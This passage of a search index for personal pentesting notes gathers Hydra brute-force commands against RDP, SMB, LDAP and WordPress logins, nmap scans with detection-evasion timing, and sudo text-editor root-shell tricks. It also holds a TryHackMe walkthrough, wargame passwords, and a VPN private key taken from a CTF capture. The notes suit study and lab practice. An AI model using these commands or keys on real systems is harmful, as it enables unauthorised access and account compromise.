-V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip Hydra attack Windows Remote Desktop with rockyou hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb Hydra brute force SMB user with rockyou hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' Hydra brute force a Wordpress admin login hydra -L usernames.txt -P passwords.txt $ip smb -V -f SMB Brute Forcing hydra -L users.txt -P passwords.txt $ip ldap2 -V -f LDAP Brute Forcing","title":"Hydra Password Cracking Cheetsheet"},{"location":"markdown/NMAP%20Notes/","text":"Nmap can be used to scan a network for active hosts using what is called a ping sweep . nmap -sP <targetip> By default, nmap only scans the top 1000 commonly used ports. If you want to scan all possible ports or only a particular port or range, you can use the -p option. For example to scan all 65535 possible ports you could use -p 1-65535 or a short cut of -p- . * example: nmap -p- 10.1.16.12 You can combine options on the command line to find additional information: For example, you can determine the operatingsystem of a target by using the -O optionand can check the version of a particularservice with the -sV- option. * example: nmap -p 80 -sV -O 10.1.16.12 To perform a ping Sweep : * example: nmap -sP 10.1.16.0/24 to perform a TCP connect scan: * example: nmap -sT 10.1.16.0/24 to perform a SYN Stealth scan: * Example: nmap -sS 10.1.16.0/24 to perform a UDP scan * example: nmap -sU 10.1.16.1 to perform a port scan without host discovery * example: nmap -Pn 10.1.16.1 To perform a stealth scan (only sends SYN packet) * example: nmap -sS 10.1.16.1 To perform a default script scan: * example: nmap -sC 10.1.16.1 One commonly used option is -A which performs OS detection, version detection of services, script scanning for vulnerabilities and traceroute all in one option. * Example: nmap -A 10.1.16.1 Due to the fact that most modern firewalls and IDS systems are familiar with the pattern of ping sweeps and SYN scans used by a port mapper, these type of scanning activities can be noticed and logged. To help avoid this, nmap supports a timing option using the -TX option where X is a number between 0 and five, with 5 being the fastest scan and 0 being the slowest. See the chart below for the meaning of the numbers. Obviously, slowing down a scan can help avoid detection. Option Use * -T0 | Paranoid * -T1 | Sneaky * -T2 | Polite * -T3 | Normal * -T4 | Aggressive * -T5 | Insane Nmap also supports scripts which can help detect vulnerabilities in our target systems. The -sC runs the default scripts, but a user can also use the --script= option to run any particular scripts they wish. The script database can also be updated with --script-updated option. Banner information capture: * Example: nmap --script=banner 10.1.16.1 * OR: nmap --script=vuln <ip> One last set of options involve nmap's ability to output its results into multiple different format using the -o option. See the table below for the formats. Option Format * -oN | Normal text * -oX | XML text * -oG | Grepable text **To convert .XML to .HTML** Run: `xsltproc <filename>.xml -o <filename>.HTML` Example of how to enumerate a network and output to an .xml and convert to .html * `nmap -O 10.1.16.0/24 -oX enum.xml && xsltproc enum.xml -o enum.html` then just run `firefox enum.html` to see the scanned results in a readable format.","title":"NMAP Notes"},{"location":"markdown/Notes%28from%20winOS%29/","text":"Notes Important Python libraries for Pentesting Request - simple HTTP library. Scapy - send, sniff, dissect and forge network packets Pwntools - a CTF & exploit development library. Default Passwords List of default passwords OverTheWire.org Bandit passwords Level 0 * bandit0 Level 0-->1 * NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL Level 1-->2 * rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi Level 2-->3 * aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG Level 3-->4 * 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe Level 4-->5 * lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR Level 5-->6 * P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU Level 6-->7 * z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S Level 7-->8 * TESKZC0XvTetK0S9xNwm25STk5iWrBvP Level 8-->9 * EN632PlfYiZbn3PhVK3XOGSlNInNE00t Level 9-->10 * G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s Level 10-->11 *","title":"Notes(from winOS)"},{"location":"markdown/Notes%28from%20winOS%29/#notes","text":"","title":"Notes"},{"location":"markdown/Notes%28from%20winOS%29/#important-python-libraries-for-pentesting","text":"Request - simple HTTP library. Scapy - send, sniff, dissect and forge network packets Pwntools - a CTF & exploit development library.","title":"Important Python libraries for Pentesting"},{"location":"markdown/Notes%28from%20winOS%29/#default-passwords","text":"List of default passwords","title":"Default Passwords"},{"location":"markdown/Notes%28from%20winOS%29/#overthewireorg-bandit-passwords","text":"Level 0 * bandit0 Level 0-->1 * NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL Level 1-->2 * rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi Level 2-->3 * aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG Level 3-->4 * 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe Level 4-->5 * lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR Level 5-->6 * P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU Level 6-->7 * z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S Level 7-->8 * TESKZC0XvTetK0S9xNwm25STk5iWrBvP Level 8-->9 * EN632PlfYiZbn3PhVK3XOGSlNInNE00t Level 9-->10 * G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s Level 10-->11 *","title":"OverTheWire.org Bandit passwords"},{"location":"markdown/Notes/","text":"Notes Important Python libraries for Pentesting Request - simple HTTP library. Scapy - send, sniff, dissect and forge network packets Pwntools - a CTF & exploit development library. OverTheWire.org Bandit passwords Level 0 * bandit0 Level 0-->1 * NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL Level 1-->2 * rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi Level 2-->3 * aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG Level 3-->4 * 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe Level 4-->5 * lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR Level 5-->6 * P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU Level 6-->7 * z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S Level 7-->8 * TESKZC0XvTetK0S9xNwm25STk5iWrBvP Level 8-->9 * EN632PlfYiZbn3PhVK3XOGSlNInNE00t Level 9-->10 * G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s Level 10-->11 * 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM Level 11-->12 * JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv Level 11-->12 *","title":"Notes"},{"location":"markdown/Notes/#notes","text":"","title":"Notes"},{"location":"markdown/Notes/#important-python-libraries-for-pentesting","text":"Request - simple HTTP library. Scapy - send, sniff, dissect and forge network packets Pwntools - a CTF & exploit development library.","title":"Important Python libraries for Pentesting"},{"location":"markdown/Notes/#overthewireorg-bandit-passwords","text":"Level 0 * bandit0 Level 0-->1 * NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL Level 1-->2 * rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi Level 2-->3 * aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG Level 3-->4 * 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe Level 4-->5 * lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR Level 5-->6 * P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU Level 6-->7 * z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S Level 7-->8 * TESKZC0XvTetK0S9xNwm25STk5iWrBvP Level 8-->9 * EN632PlfYiZbn3PhVK3XOGSlNInNE00t Level 9-->10 * G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s Level 10-->11 * 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM Level 11-->12 * JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv Level 11-->12 *","title":"OverTheWire.org Bandit passwords"},{"location":"markdown/PacketCaptureVPNkeyFind/","text":"Find VPN key in this packet capture: Packet Capture Download What vpn protocol has a key exhcange vpn IKE? isakmp din't work out so well started looking at all the noise and noticed 107.172.29.202 was ping sweeping and creating too many packets to wade through. Tried to filter out noise. applied this filter ip.dst != 107.172.29.202 && ip.src !=107.172.29.202 && ip.addr != 204.11.56.48 && !icmp NetCat Stream nc -nv 10.8.0.2 8888 file: comp.ovpn client proto tcp remote 198.12.71.251 443 dev tun resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server verify-x509-name server_GYnO1H974rtzuMEp name auth SHA256 auth-nocache cipher AES-128-GCM tls-client tls-version-min 1.2 tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256 ignore-unknown-option block-outside-dns setenv opt block-outside-dns # Prevent Windows 10 DNS leak verb 3 -----BEGIN CERTIFICATE----- MIIB1zCCAX2gAwIBAgIUakrFUEvYZlgIXTjvEzxcfIMva3cwCgYIKoZIzj0EAwIw HjEcMBoGA1UEAwwTY25fZXk2em9nWm9WcXRFMmMxQzAeFw0yMzAzMjAwNDU4MDRa Fw0zMzAzMTcwNDU4MDRaMB4xHDAaBgNVBAMME2NuX2V5NnpvZ1pvVnF0RTJjMUMw WTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAQU0lxDnn9OeHCbPpbclRjreeu5XFic gZ4VdXhqZdS5ddT1rYA+O+1upFjxqWgpa9FF1eY9xNxy8uUTiwuSd0gRo4GYMIGV MB0GA1UdDgQWBBRAiM5/p35bdCsEa0QtU//cN7GiRTBZBgNVHSMEUjBQgBRAiM5/ p35bdCsEa0QtU//cN7GiRaEipCAwHjEcMBoGA1UEAwwTY25fZXk2em9nWm9WcXRF MmMxQ4IUakrFUEvYZlgIXTjvEzxcfIMva3cwDAYDVR0TBAUwAwEB/zALBgNVHQ8E BAMCAQYwCgYIKoZIzj0EAwIDSAAwRQIhAOOn9Rjzb0XcqtH5WfDqth9KRyVIwxvo zVtXzDU6twJWAiBHOF4EB5RWoeAGI6Jw/+hDfdu/iXQLRdEOgHTXpoOH2Q== -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- MIIB1jCCAXygAwIBAgIQCk74lRL1yQDajAmX9+eBxTAKBggqhkjOPQQDAjAeMRww GgYDVQQDDBNjbl9leTZ6b2dab1ZxdEUyYzFDMB4XDTIzMDMyMDA0NTgxNFoXDTI1 MDYyMjA0NTgxNFowDzENMAsGA1UEAwwEY29tcDBZMBMGByqGSM49AgEGCCqGSM49 AwEHA0IABE4x+pkqugsDh9C1yeqh72OdeZFybhJfXJAl8SkAJ1HMPXH3am9eBiOv bdMQofnvgUu9JkqTPBS+elyZHhhcgRyjgaowgacwCQYDVR0TBAIwADAdBgNVHQ4E FgQUYMFkHaFY5NyZPTo++/PIvTLKlWQwWQYDVR0jBFIwUIAUQIjOf6d+W3QrBGtE LVP/3DexokWhIqQgMB4xHDAaBgNVBAMME2NuX2V5NnpvZ1pvVnF0RTJjMUOCFGpK xVBL2GZYCF047xM8XHyDL2t3MBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE AwIHgDAKBggqhkjOPQQDAgNIADBFAiEA4WBbt/OqLyh5x77uZxo/JtZ0/3tmrciV XaMmxRpSA0UCIE/rnSweh/8TGHtFLFtxnwJew2146N0+7+flgphTDBw8 -----END CERTIFICATE----- -----BEGIN PRIVATE KEY----- MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgPrjkMvXCFte61hsj V0cVtUUuSByFffxqqLV8rRgLWMmhRANCAAROMfqZKroLA4fQtcnqoe9jnXmRcm4S X1yQJfEpACdRzD1x92pvXgYjr23TEKH574FLvSZKkzwUvnpcmR4YXIEc -----END PRIVATE KEY----- 2048 bit OpenVPN static key -----BEGIN OpenVPN Static key V1----- e63d2f5a0049779fba6d2faacd0a4d4a bca313bb2e084dbd4c87f4e7e3c1a355 c2d22a996256a73d339b57b64234eaa0 6e82ef6639e4c4dda8995cff5f8e916e 7d3af53d04148d8cee52a376a25a5feb 63d9ac088c2602df526510024350e96e ee492a314f1cf8e4b524a95171a8c15b ac896d5d61416b3266bac9d62d27105b 9e94655da4870996e7147a058fce8bbf e07b2eeaef0691d7fc28df3e4f78f58d d757d29cd8a156b15b2af678b6b9dff3 0f8d63e829a0c98de46ac915d754ee8c 3e47799f4850537184e4ba3a70b5110b 4f674dd2a7255c61a8aeedcd1015fbad a030a0ce072f696c93e03f3dfeebddcc db59dc7a33fe0d23889857cf4c121dc9 -----END OpenVPN Static key V1----- EOF whoami www-data","title":"PacketCaptureVPNkeyFind"},{"location":"markdown/PacketCaptureVPNkeyFind/#find-vpn-key-in-this-packet-capture","text":"Packet Capture Download What vpn protocol has a key exhcange vpn IKE? isakmp din't work out so well started looking at all the noise and noticed 107.172.29.202 was ping sweeping and creating too many packets to wade through. Tried to filter out noise. applied this filter ip.dst != 107.172.29.202 && ip.src !=107.172.29.202 && ip.addr != 204.11.56.48 && !icmp","title":"Find VPN key in this packet capture:"},{"location":"markdown/PacketCaptureVPNkeyFind/#netcat-stream","text":"nc -nv 10.8.0.2 8888 file: comp.ovpn client proto tcp remote 198.12.71.251 443 dev tun resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server verify-x509-name server_GYnO1H974rtzuMEp name auth SHA256 auth-nocache cipher AES-128-GCM tls-client tls-version-min 1.2 tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256 ignore-unknown-option block-outside-dns setenv opt block-outside-dns # Prevent Windows 10 DNS leak verb 3 -----BEGIN CERTIFICATE----- MIIB1zCCAX2gAwIBAgIUakrFUEvYZlgIXTjvEzxcfIMva3cwCgYIKoZIzj0EAwIw HjEcMBoGA1UEAwwTY25fZXk2em9nWm9WcXRFMmMxQzAeFw0yMzAzMjAwNDU4MDRa Fw0zMzAzMTcwNDU4MDRaMB4xHDAaBgNVBAMME2NuX2V5NnpvZ1pvVnF0RTJjMUMw WTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAQU0lxDnn9OeHCbPpbclRjreeu5XFic gZ4VdXhqZdS5ddT1rYA+O+1upFjxqWgpa9FF1eY9xNxy8uUTiwuSd0gRo4GYMIGV MB0GA1UdDgQWBBRAiM5/p35bdCsEa0QtU//cN7GiRTBZBgNVHSMEUjBQgBRAiM5/ p35bdCsEa0QtU//cN7GiRaEipCAwHjEcMBoGA1UEAwwTY25fZXk2em9nWm9WcXRF MmMxQ4IUakrFUEvYZlgIXTjvEzxcfIMva3cwDAYDVR0TBAUwAwEB/zALBgNVHQ8E BAMCAQYwCgYIKoZIzj0EAwIDSAAwRQIhAOOn9Rjzb0XcqtH5WfDqth9KRyVIwxvo zVtXzDU6twJWAiBHOF4EB5RWoeAGI6Jw/+hDfdu/iXQLRdEOgHTXpoOH2Q== -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- MIIB1jCCAXygAwIBAgIQCk74lRL1yQDajAmX9+eBxTAKBggqhkjOPQQDAjAeMRww GgYDVQQDDBNjbl9leTZ6b2dab1ZxdEUyYzFDMB4XDTIzMDMyMDA0NTgxNFoXDTI1 MDYyMjA0NTgxNFowDzENMAsGA1UEAwwEY29tcDBZMBMGByqGSM49AgEGCCqGSM49 AwEHA0IABE4x+pkqugsDh9C1yeqh72OdeZFybhJfXJAl8SkAJ1HMPXH3am9eBiOv bdMQofnvgUu9JkqTPBS+elyZHhhcgRyjgaowgacwCQYDVR0TBAIwADAdBgNVHQ4E FgQUYMFkHaFY5NyZPTo++/PIvTLKlWQwWQYDVR0jBFIwUIAUQIjOf6d+W3QrBGtE LVP/3DexokWhIqQgMB4xHDAaBgNVBAMME2NuX2V5NnpvZ1pvVnF0RTJjMUOCFGpK xVBL2GZYCF047xM8XHyDL2t3MBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE AwIHgDAKBggqhkjOPQQDAgNIADBFAiEA4WBbt/OqLyh5x77uZxo/JtZ0/3tmrciV XaMmxRpSA0UCIE/rnSweh/8TGHtFLFtxnwJew2146N0+7+flgphTDBw8 -----END CERTIFICATE----- -----BEGIN PRIVATE KEY----- MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgPrjkMvXCFte61hsj V0cVtUUuSByFffxqqLV8rRgLWMmhRANCAAROMfqZKroLA4fQtcnqoe9jnXmRcm4S X1yQJfEpACdRzD1x92pvXgYjr23TEKH574FLvSZKkzwUvnpcmR4YXIEc -----END PRIVATE KEY----- 2048 bit OpenVPN static key -----BEGIN OpenVPN Static key V1----- e63d2f5a0049779fba6d2faacd0a4d4a bca313bb2e084dbd4c87f4e7e3c1a355 c2d22a996256a73d339b57b64234eaa0 6e82ef6639e4c4dda8995cff5f8e916e 7d3af53d04148d8cee52a376a25a5feb 63d9ac088c2602df526510024350e96e ee492a314f1cf8e4b524a95171a8c15b ac896d5d61416b3266bac9d62d27105b 9e94655da4870996e7147a058fce8bbf e07b2eeaef0691d7fc28df3e4f78f58d d757d29cd8a156b15b2af678b6b9dff3 0f8d63e829a0c98de46ac915d754ee8c 3e47799f4850537184e4ba3a70b5110b 4f674dd2a7255c61a8aeedcd1015fbad a030a0ce072f696c93e03f3dfeebddcc db59dc7a33fe0d23889857cf4c121dc9 -----END OpenVPN Static key V1----- EOF whoami www-data","title":"NetCat Stream"},{"location":"markdown/Pentesting%20Online%20Tools/","text":"Pentesting Online Tools DorkGPT Generate Google Dorks with AI CyberChef A simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages. CyberChef encourages both technical and non-technical people to explore data formats, encryption and compression. Shodan Shodan.io is a search engine used to search for internet-connected devices including IoT devices. These devices are not always properly secured and can be riddled with vulnerabilities and default password credentials, a veritable playground for hackers. With a simple Shodan.io search query, you can learn more about vulnerable devices and how these could be exploited.","title":"Pentesting Online Tools"},{"location":"markdown/Pentesting%20Online%20Tools/#pentesting-online-tools","text":"","title":"Pentesting Online Tools"},{"location":"markdown/Pentesting%20Online%20Tools/#dorkgpt","text":"Generate Google Dorks with AI","title":"DorkGPT"},{"location":"markdown/Pentesting%20Online%20Tools/#cyberchef","text":"A simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages. CyberChef encourages both technical and non-technical people to explore data formats, encryption and compression.","title":"CyberChef"},{"location":"markdown/Pentesting%20Online%20Tools/#shodan","text":"Shodan.io is a search engine used to search for internet-connected devices including IoT devices. These devices are not always properly secured and can be riddled with vulnerabilities and default password credentials, a veritable playground for hackers. With a simple Shodan.io search query, you can learn more about vulnerable devices and how these could be exploited.","title":"Shodan"},{"location":"markdown/Pentesting%20Tools/","text":"Pentesting Tools tldr autorecon seclists copyq","title":"Pentesting Tools"},{"location":"markdown/Pentesting%20Tools/#pentesting-tools","text":"tldr autorecon seclists copyq","title":"Pentesting Tools"},{"location":"markdown/Privilege%20Escalation%20using%20text%20editors/","text":"Privilege Escalation in a Linux System. link to guide Scenario \u2014 1: Using .sh file for privilege escalation There was this box which I was trying to hack and get the root access. So basically, I was able to execute the following commands and files as root in the user\u2019s shell. Privilege escalation using .sh From the above, you can tell that the user haris is able to execute the file test.sh as root. Which means that if he executes the file using sudo it will be equivalent to the root executing the file. Also, the NOPASSWD specifies that no password will be asked while executing the file. This is a very insecure way of allowing a user to access a file. Using above permissions, the user can easily get into root, just by doing some simple modifications in the test.sh and then executing it with sudo. Let\u2019s first see the contents of the file and let\u2019s try executing it. As you can see it is just printing a welcome message and nothing else. So how can we use this file in our favour? Well, the answer is very simple! Since it is a bash file so commands inside it will get executed, and if we execute the file as root, then all the commands inside it will also get executed as root. So, let\u2019s take advantage of that and append /bin/bash -i to the file. This will execute bash as root, which in turn will open the root shell. And we got the root! This is a pretty much simple scenario and is very easy to exploit. These type of mistakes are often done by administrators and are used by other system users and testers to get into the root. Scenario \u2014 2: Using nano for privilege escalation. Note: Root Access to any text editor other than nano can also be used to exploit such situations. Now let\u2019s take a look at a little more complicated situation. In this case, the user has access to nano text editor as root but only in a specific directory. Privilege escalation using nano The user can only use sudo in /var/opt directory, if the user will try to use it some other place, he will be restricted. Now if the /var/opt/* part was not mentioned in the /etc/sudoers file, then it would be a pretty much easy deal to exploit it, as you would be able to edit any system file as root. But that\u2019s not the case over here. it will take a little more creative approach to exploit it. Let me give you a hint: how do you traverse backwards in a directory? For example, if suppose you are in /home/user/xyz/ , then how would you traverse one step backwards to /home/user ? The answer is simple! You can simply do cd .. or cd /home/user/xyz/../ . That is the trick which can be used to exploit it. So, let\u2019s try to edit the sudoers file and try to add more privileges to the user account. But if you will try to execute the following command: sudo nano /etc/sudoers Then it will get restricted and you will get a permission denied message. But as we know, we can execute nano as root in /var/opt . So you can use it to traverse backwards and reach onto the sudoers file as shown below: sudo nano /var/opt/../../etc/sudoers Yes, that\u2019s the trick ;) Now the moment you execute it, it will open the sudoers file inside the nano text editor as root. Now modify the file and give the user haris the root privileges by modifying the file as mentioned below: Replace the marked line with haris ALL=(ALL) NOPASSWD:ALL , save the file and run sudo -i . This will give you the root shell. Scenario \u2014 3: Using Vim for privilege escalation. We are going to create a similar scenario as the previous one. But in this case, we have access to the Vim editor instead of nano and no directory restrictions are specified. Privilege escalation using Vim editor Now you must be thinking, we can repeat the same steps we did in scenario 2 to get into the root and in this case, there is no directory restriction too so it will be a straightforward approach, which is correct but there exists a simpler and easy way to do it when you have access to Vim. Vim is a very versatile text editor which have many awesome functionalities including the ability to open a shell inside it. Yes, you read it right this is what we just needed. So, to open vim as root we can use the following command. sudo vi test.sh As soon as you will execute it, vi window will open, now you need to switch into the command mode you can do that by pressing ESC key. In command mode, use :!bash command this will open a root shell. There is one more shortcut which you can use when you have access to vim, you can use the following command to trigger the root shell using vim. sudo vi -c '!bash' There are many Linux executable other than text editors which you can use for privilege escalation. I will try to include them and many more other techniques in the next part. If you guys have any other ideas which I should mention then please comment them down below.","title":"Privilege Escalation using text editors"},{"location":"markdown/Privilege%20Escalation%20using%20text%20editors/#privilege-escalation-in-a-linux-system","text":"link to guide Scenario \u2014 1: Using .sh file for privilege escalation There was this box which I was trying to hack and get the root access. So basically, I was able to execute the following commands and files as root in the user\u2019s shell. Privilege escalation using .sh From the above, you can tell that the user haris is able to execute the file test.sh as root. Which means that if he executes the file using sudo it will be equivalent to the root executing the file. Also, the NOPASSWD specifies that no password will be asked while executing the file. This is a very insecure way of allowing a user to access a file. Using above permissions, the user can easily get into root, just by doing some simple modifications in the test.sh and then executing it with sudo. Let\u2019s first see the contents of the file and let\u2019s try executing it. As you can see it is just printing a welcome message and nothing else. So how can we use this file in our favour? Well, the answer is very simple! Since it is a bash file so commands inside it will get executed, and if we execute the file as root, then all the commands inside it will also get executed as root. So, let\u2019s take advantage of that and append /bin/bash -i to the file. This will execute bash as root, which in turn will open the root shell. And we got the root! This is a pretty much simple scenario and is very easy to exploit. These type of mistakes are often done by administrators and are used by other system users and testers to get into the root. Scenario \u2014 2: Using nano for privilege escalation. Note: Root Access to any text editor other than nano can also be used to exploit such situations. Now let\u2019s take a look at a little more complicated situation. In this case, the user has access to nano text editor as root but only in a specific directory. Privilege escalation using nano The user can only use sudo in /var/opt directory, if the user will try to use it some other place, he will be restricted. Now if the /var/opt/* part was not mentioned in the /etc/sudoers file, then it would be a pretty much easy deal to exploit it, as you would be able to edit any system file as root. But that\u2019s not the case over here. it will take a little more creative approach to exploit it. Let me give you a hint: how do you traverse backwards in a directory? For example, if suppose you are in /home/user/xyz/ , then how would you traverse one step backwards to /home/user ? The answer is simple! You can simply do cd .. or cd /home/user/xyz/../ . That is the trick which can be used to exploit it. So, let\u2019s try to edit the sudoers file and try to add more privileges to the user account. But if you will try to execute the following command: sudo nano /etc/sudoers Then it will get restricted and you will get a permission denied message. But as we know, we can execute nano as root in /var/opt . So you can use it to traverse backwards and reach onto the sudoers file as shown below: sudo nano /var/opt/../../etc/sudoers Yes, that\u2019s the trick ;) Now the moment you execute it, it will open the sudoers file inside the nano text editor as root. Now modify the file and give the user haris the root privileges by modifying the file as mentioned below: Replace the marked line with haris ALL=(ALL) NOPASSWD:ALL , save the file and run sudo -i . This will give you the root shell. Scenario \u2014 3: Using Vim for privilege escalation. We are going to create a similar scenario as the previous one. But in this case, we have access to the Vim editor instead of nano and no directory restrictions are specified. Privilege escalation using Vim editor Now you must be thinking, we can repeat the same steps we did in scenario 2 to get into the root and in this case, there is no directory restriction too so it will be a straightforward approach, which is correct but there exists a simpler and easy way to do it when you have access to Vim. Vim is a very versatile text editor which have many awesome functionalities including the ability to open a shell inside it. Yes, you read it right this is what we just needed. So, to open vim as root we can use the following command. sudo vi test.sh As soon as you will execute it, vi window will open, now you need to switch into the command mode you can do that by pressing ESC key. In command mode, use :!bash command this will open a root shell. There is one more shortcut which you can use when you have access to vim, you can use the following command to trigger the root shell using vim. sudo vi -c '!bash' There are many Linux executable other than text editors which you can use for privilege escalation. I will try to include them and many more other techniques in the next part. If you guys have any other ideas which I should mention then please comment them down below.","title":"Privilege Escalation in a Linux System."},{"location":"markdown/ShellUpgrade/","text":"Shell Upgrade python3 -c 'import pty;pty.spawn(\"/bin/bash\")';","title":"ShellUpgrade"},{"location":"markdown/ShellUpgrade/#shell-upgrade","text":"python3 -c 'import pty;pty.spawn(\"/bin/bash\")';","title":"Shell Upgrade"},{"location":"markdown/Steghide/","text":"Embedding File Using Steghide Let's create a text file containing our secret message that we will conceal within a photo. Run touch secret.txt, then run ls to view the output. touch-secret.png Run nano secret.txt to edit our secret file. nano-secret.png nanosecret.png In our secret file we will add our secret below: The password is: Pa$$w0rd CTRL+O to write out the file, then press ENTER. Type y and press ENTER. ENTER again to save file name and exit nano. write-secret.png Now we will embed secret.txt into our image using the following command steghide embed -cf ~/Pictures/Square.jpeg -ef secret.txt Enter passphrase: Pass steghide-embed.png To see the list of options for steghide just type steghide into the terminal and press ENTER to list out the options. Steghide options Navigate to the directory where our picture is located. Type cd Pictures/ and press Enter to exit nano. cd-Pictures.png This is just a normal image from what we can see. We can view the image using Ristretto Image Viewer. Enter the command: ristretto square.jpeg ristretto square.jpeg view-image.png ristretto-square.png Exit ristretto after viewing the image. Using the --info option we can see that there is an embedded file in this image. Run steghide --info Square.jpeg Select y when prompted to enter the password for Square.jpeg Type in the password Pass steg-info.png This tells us that this image has our embedded file secret.txt, encrypted using rijndael-128 (AES) block cipher (cbc), and the embedded file is compressed. We can now extract our embed secret from our image with the following command. steghide extract -sf Square.jpeg Enter passphrase: Pass Type ls to see our secret has been extracted from our file. Example Type ls to list out the files in the Pictures directory. steghide-ls.png Read out the secret.txt file using 'cat' cat secret.txt cat-secrettext.png","title":"Steghide"},{"location":"markdown/THM%20Easy%20CTF/","text":"THM Easy CTF recon Target IP: 10.10.54.244 PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 2222/tcp open EtherNetIP-1 (ssh) SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8 exploit Path to root priveldge ftp into port 21 login: anonymous download: get Formitch.txt feroxbuster: http port 80 find login page with php.login brute force login page with hydra using: username: mitch password list: seclists top 100 or more passwords username: mitch password: secret ssh into box on port 2222 with mitch as user ssh -p 2222 mitch@ login with password above. Next we need to see what sudo priveledges the user mitch might have sudo -l we see that we can run vim as root. this tells us we just need to launch a vim and escalate to root by either of these commands: sudo vi test.sh once inside the vim editor we just need to hit ESC to get to command mode and type out the command to open a root shell :!bash viola!!! we are in or you could try sudo vi -c '!bash' note the two looking single quotes in that command are different.","title":"THM Easy CTF"},{"location":"markdown/THM%20Easy%20CTF/#thm-easy-ctf","text":"","title":"THM Easy CTF"},{"location":"markdown/THM%20Easy%20CTF/#recon","text":"Target IP: 10.10.54.244 PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 2222/tcp open EtherNetIP-1 (ssh) SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8 exploit","title":"recon"},{"location":"markdown/THM%20Easy%20CTF/#path-to-root-priveldge","text":"ftp into port 21 login: anonymous download: get Formitch.txt feroxbuster: http port 80 find login page with php.login brute force login page with hydra using: username: mitch password list: seclists top 100 or more passwords username: mitch password: secret ssh into box on port 2222 with mitch as user ssh -p 2222 mitch@ login with password above. Next we need to see what sudo priveledges the user mitch might have sudo -l we see that we can run vim as root. this tells us we just need to launch a vim and escalate to root by either of these commands: sudo vi test.sh once inside the vim editor we just need to hit ESC to get to command mode and type out the command to open a root shell :!bash viola!!! we are in or you could try sudo vi -c '!bash' note the two looking single quotes in that command are different.","title":"Path to root priveldge"},{"location":"markdown/The%20Metasploit%20Framework/","text":"The Metasploit Framework The Metasploit Framework is a very powerful tool for penetration testing. It is a text-based, menu-driven program that comes in both a Commercial Pro and an open source or Community version. The Community edition is included with Kali and can also be installed on other systems. Metasploit can be launched from the Kali menus under the Favorites or Exploitation Tools sub menus or by typing msfconsole at the command line. msfconsole Metasploit menu Metasploit comes with hundreds of exploits, payloads and additional resources to assist during a penetration test. Before diving into the exploits and other resources, let's take a brief tour of the system. To begin, enter help and scroll up to review all the available options within Metasploit. Metasploit help One command to note is msfupdate. This command is not found in the help menu and will not work in this lab environment, but should be run from time to time on a live installation in order to keep Metasploit up-to-date with the latest exploits and resources. The Search command is also a powerful tool in Metasploit. You can use it to look for anything within the Metasploit framework. The Search command offers options such as name: and type: to help narrow down your search. To use search, type search name:Apple type:exploit for potential Apple exploits. search name:Apple type:exploit Metasploit search A number of potential exploits are returned, note: Exploits and resources in Metasploit are organized in a folder structure. The Rank column rates exploits from: excellent, great, good, normal to average. Generally, one would want to use a higher ranked exploit during a pen test to achieve a higher rate of success. It is also worth noting that many of these exploits are old and thus would only work against older and unpatched systems. Scroll to the first entry in the Search results, which is an Apple browser exploit, ranked: good. Let's find out more about this exploit with the command info. Info is a powerful command that returns important information about each exploit or module, such as: Name Platform Available targets Basic options - required options you will need to know in order to set up and use the exploit. Type info exploit/apple_ios/browser/safari_libtiff for more info on this exploit. info exploit/apple_ios/browser/safari_libtiff 